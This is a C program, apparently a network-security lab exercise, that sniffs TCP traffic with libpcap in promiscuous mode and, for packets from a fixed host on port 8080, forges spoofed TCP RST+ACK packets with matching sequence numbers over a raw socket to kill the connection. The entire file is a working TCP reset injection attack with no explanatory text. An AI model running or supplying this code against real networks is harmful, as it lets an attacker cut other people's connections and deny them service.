#pragma GCC optimize("Ofast")
#pragma GCC optimization("unroll-loops, no-stack-protector")
#pragma GCC target("avx,avx2,fma")
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h> // contains ether_header
#include <netinet/ip.h>   // contains ip header iphdr
#include <netinet/tcp.h>  // contains tcp header tcphdr
#define DATAGRAM_LENGTH 200

struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

uint16_t csum(uint16_t *ptr, int nbytes)
{
    register long sum;
    uint16_t oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

int spoof(struct iphdr *ip_header_server, struct tcphdr *tcp_header_server, uint16_t payload_size)
{
    //Create a raw socket
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

    if (s == -1)
    {
        //socket creation failed, may be because of non-root privileges
        perror("Failed to create socket");
        exit(1);
    }

    //Datagram to represent the packet
    unsigned char datagram[DATAGRAM_LENGTH], *pseudogram;
    srand(time(0));

    //zero out the packet buffer
    memset(datagram, 0, DATAGRAM_LENGTH);

    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;

    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    //some address resolution
    sin.sin_family = AF_INET;
    sin.sin_port = htons(8080);
    sin.sin_addr.s_addr = ip_header_server->saddr;

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand();
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; //Set to 0 before calculating checksum
    iph->saddr = ip_header_server->daddr;
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));

    //TCP Header
    tcph->source = tcp_header_server->dest;
    tcph->dest = tcp_header_server->source;
    tcph->seq = tcp_header_server->ack_seq;
    tcph->ack_seq = htonl(ntohl(tcp_header_server->seq) + payload_size);
    tcph->doff = 5; //tcp header size
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 1;
    tcph->psh = 0;
    tcph->ack = 1;
    tcph->urg = 0;
    tcph->window = htons(2017);
    tcph->check = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;

    //Now the TCP checksum
    psh.source_address = ip_header_server->daddr;
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    pseudogram = malloc(psize);

    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    tcph->check = csum((unsigned short *)pseudogram, psize);

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;

    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    if (sendto(s, datagram, htons(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        perror("Sending failed");
    }

    return 0;
}

void process_ethernet_frame(u_char *args, const struct pcap_pkthdr *header,
                            const u_char *packet)
{
    struct ether_header *eth = (struct ether_header *)packet;
    if (ntohs(eth->ether_type) == 0x0800) // just consider ip
    {
        struct iphdr *iph = (struct iphdr *)(packet + sizeof(struct ether_header));

        const int non_tcp = sizeof(struct ether_header) + iph->ihl * 4;
        struct tcphdr *tcph = (struct tcphdr *)(packet + non_tcp);
        if (iph->saddr == inet_addr("192.168.0.105") && ntohs(tcph->source) == 8080)
        {
            const int tcp_header_size = tcph->doff * 4;
            const int payload_size = header->len - non_tcp - tcp_header_size;
            spoof(iph, tcph, (uint16_t)payload_size);
        }

        return;
    }
}

int main()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "tcp";

    bpf_u_int32 net;
    handle = pcap_open_live("enp1s0", BUFSIZ, 1, 1000, errbuf);
    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);
    pcap_loop(handle, -1, process_ethernet_frame, NULL);
    pcap_close(handle);
    return 0;
}
